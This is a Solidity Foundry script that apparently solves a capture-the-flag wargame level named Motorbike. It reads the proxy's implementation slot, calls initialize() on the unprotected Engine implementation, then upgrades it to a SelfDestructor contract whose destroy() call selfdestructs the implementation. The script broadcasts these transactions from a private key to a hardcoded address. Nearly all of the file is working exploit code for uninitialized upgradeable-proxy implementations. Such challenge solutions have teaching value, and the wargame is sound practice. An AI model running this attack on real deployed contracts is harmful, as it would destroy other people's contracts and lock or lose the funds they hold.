pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;
import "../instances/Ilevel25.sol";
import "forge-std/Test.sol";

contract Level25 is Test {
    bytes32 internal constant _IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    Motorbike level25 =
        Motorbike(payable(0x99D96e35346cCDFB41e2Abf3affc191C3f5bB869));
    Engine engine;

    function test() external {
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(attackerPrivateKey);
        address engineAddress = address(
            uint160(uint256(vm.load(address(level25), _IMPLEMENTATION_SLOT)))
        );
        engine = Engine(engineAddress);
        vm.startBroadcast(attackerPrivateKey);
        SelfDestructor selfDestructor = new SelfDestructor();
        engine.initialize();
        engine.upgradeToAndCall(
            address(selfDestructor),
            abi.encodeWithSignature("destroy()")
        );
        vm.stopBroadcast();
    }
}

contract SelfDestructor {
    address private immutable __self = address(this);
    modifier onlyProxy() {
        require(
            address(this) != __self,
            "Function must be called through delegatecall"
        );
        _;
    }

    function destroy() public onlyProxy {
        selfdestruct(msg.sender);
    }
}
